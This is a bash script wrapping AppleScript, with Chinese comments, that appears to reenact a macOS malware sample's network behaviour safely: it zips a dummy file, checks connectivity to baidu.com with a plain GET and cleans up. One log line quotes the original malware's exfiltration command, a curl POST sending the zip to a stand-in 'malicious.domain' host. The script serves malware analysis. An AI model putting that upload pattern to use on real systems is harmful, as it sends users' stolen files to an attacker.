#!/bin/bash

# 简化的网络连接和压缩包发送测试
# 专门用于测试恶意软件的网络行为

echo "🌐 网络连接和压缩包发送测试"
echo "=================================="
echo ""

# 执行简化的AppleScript测试
/bin/bash -c "osascript -e '
-- 简化的网络连接测试脚本

-- 日志记录函数
on logAction(action)
    set logFile to \"/tmp/network_test.log\"
    set timestamp to (current date) as string
    set logEntry to timestamp & \" - \" & action & return
    
    try
        set fileRef to open for access logFile with write permission
        write logEntry to fileRef starting at eof
        close access fileRef
    on error
        try
            close access logFile
        end try
    end try
end logAction

logAction(\"=== 网络连接测试开始 ===\")

try
    -- 创建测试数据
    set randomNumber to (random number from 1000 to 9999) as string
    set testDir to \"/tmp/test_\" & randomNumber & \"/\"
    set testFile to testDir & \"test_data.txt\"
    set zipFile to \"/tmp/test_\" & randomNumber & \".zip\"
    
    logAction(\"创建测试目录: \" & testDir)
    do shell script \"mkdir -p \" & quoted form of testDir
    
    -- 创建测试数据文件
    logAction(\"创建测试数据文件\")
    set testData to \"测试数据 - \" & (current date) as string
    set fileRef to open for access testFile with write permission
    write testData to fileRef
    close access fileRef
    
    logAction(\"测试文件创建完成: \" & testFile)
    
    -- 创建压缩包
    logAction(\"创建压缩包: \" & zipFile)
    do shell script \"ditto -c -k --sequesterRsrc \" & quoted form of testDir & \" \" & quoted form of zipFile
    
    -- 检查压缩包
    set zipInfo to (do shell script \"ls -lh \" & quoted form of zipFile)
    logAction(\"压缩包创建成功: \" & zipInfo)
    
    -- 测试网络连接
    logAction(\"开始网络连接测试\")
    
    try
        -- 测试基本连接
        set httpResponse to (do shell script \"curl -s -o /dev/null -w '%{http_code}' www.baidu.com\")
        logAction(\"网络连接测试: HTTP \" & httpResponse)
        
        if httpResponse is \"200\" then
            logAction(\"✅ 网络连接正常\")
            display notification \"网络连接测试成功\" with title \"网络测试\"
            
            -- 模拟压缩包上传（GET请求，不实际上传文件）
            logAction(\"模拟压缩包上传测试\")
            set uploadTest to (do shell script \"curl -s -o /dev/null -w '%{http_code}' -X GET www.baidu.com\")
            logAction(\"上传模拟测试: HTTP \" & uploadTest)
            
            if uploadTest is \"200\" then
                logAction(\"✅ 模拟上传成功 - 原始恶意软件会在此处上传窃取的数据\")
                display notification \"上传测试成功\" with title \"网络测试\"
                
                -- 记录原始恶意行为
                logAction(\"原始恶意命令: curl -X POST -H user: [REDACTED] -H BuildID: [REDACTED] -F file=@\" & zipFile & \" https://malicious.domain/contact\")
                
            else
                logAction(\"❌ 上传测试失败: HTTP \" & uploadTest)
            end if
            
        else
            logAction(\"❌ 网络连接失败: HTTP \" & httpResponse)
            display notification \"网络连接失败\" with title \"网络测试\"
        end if
        
    on error networkError
        logAction(\"❌ 网络错误: \" & networkError)
        display notification \"网络测试出错\" with title \"网络测试\"
    end try
    
    -- 清理测试文件
    logAction(\"清理测试文件\")
    try
        do shell script \"rm -rf \" & quoted form of testDir
        do shell script \"rm -f \" & quoted form of zipFile
        logAction(\"✅ 清理完成\")
    on error cleanupError
        logAction(\"清理错误: \" & cleanupError)
    end try
    
    logAction(\"=== 网络连接测试结束 ===\")
    
    -- 显示结果
    display dialog \"🎯 网络连接测试完成！\" & return & return & \"测试项目：\" & return & \"✅ 压缩包创建\" & return & \"✅ 网络连接检测\" & return & \"✅ 数据上传模拟\" & return & \"✅ 文件清理\" & return & return & \"📊 详细日志: /tmp/network_test.log\" with title \"网络测试报告\" buttons {\"查看日志\", \"完成\"} default button \"完成\"
    
    set buttonPressed to button returned of result
    if buttonPressed is \"查看日志\" then
        do shell script \"open -a TextEdit /tmp/network_test.log\"
    end if
    
on error scriptError
    logAction(\"脚本执行错误: \" & scriptError)
    display dialog \"测试过程出现错误: \" & scriptError buttons {\"确定\"} default button \"确定\"
end try
'"

echo ""
echo "✅ 网络连接测试执行完成！"
echo ""

# 显示测试结果摘要
if [ -f "/tmp/network_test.log" ]; then
    echo "📊 测试结果摘要:"
    echo "=================="
    
    if grep -q "网络连接正常" /tmp/network_test.log; then
        echo "🌐 网络连接: ✅ 成功"
    else
        echo "🌐 网络连接: ❌ 失败"
    fi
    
    if grep -q "压缩包创建成功" /tmp/network_test.log; then
        echo "📦 压缩包创建: ✅ 成功"
    else
        echo "📦 压缩包创建: ❌ 失败"
    fi
    
    if grep -q "模拟上传成功" /tmp/network_test.log; then
        echo "📤 上传模拟: ✅ 成功"
    else
        echo "📤 上传模拟: ❌ 失败"
    fi
    
    echo ""
    echo "📄 完整日志: /tmp/network_test.log"
    echo "📝 最后几行日志:"
    echo "=================="
    tail -5 /tmp/network_test.log
else
    echo "⚠️ 未生成日志文件"
fi 
